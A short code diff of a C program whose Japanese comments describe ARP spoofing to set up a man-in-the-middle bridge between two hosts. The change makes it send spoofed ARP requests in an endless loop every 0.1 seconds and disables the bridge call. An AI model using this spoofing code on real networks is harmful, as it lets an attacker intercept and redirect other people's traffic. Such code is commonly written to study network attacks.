@@ -13,6 +13,7 @@
 #include    <netinet/ip.h>
 #include	"netutil.h"
 
+#include <unistd.h>
 
 
 typedef struct	{
@@ -477,8 +478,9 @@ int main(int argc,char *argv[],char *envp[])
     //SendArpRequestB(Device[0].soc, recIp.s_addr, bcast, Device[0].addr.s_addr, Device[0].hwaddr);
     //sendIp→recIpの通信をこちらに回すARPスプーフィング。相手のIPアドレスに、こちらは端末BのIPアドレス、かつ自分のMACアドレスを入れてリクエストを送る
     int     i=0;
-    for(i=0; i<100; i++){
+    while(1){
         SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
+        usleep(0.1 * 1000000);
     }
     
     //TODO:あとでPARAMSに移動
@@ -488,7 +490,7 @@ int main(int argc,char *argv[],char *envp[])
     
     //---ARPスプーフィングここまで
     //---ブリッジ
-    MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
+    //MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
     //Bridge();
     //---ブリッジここまで
     DebugPrintf("bridge end\n");
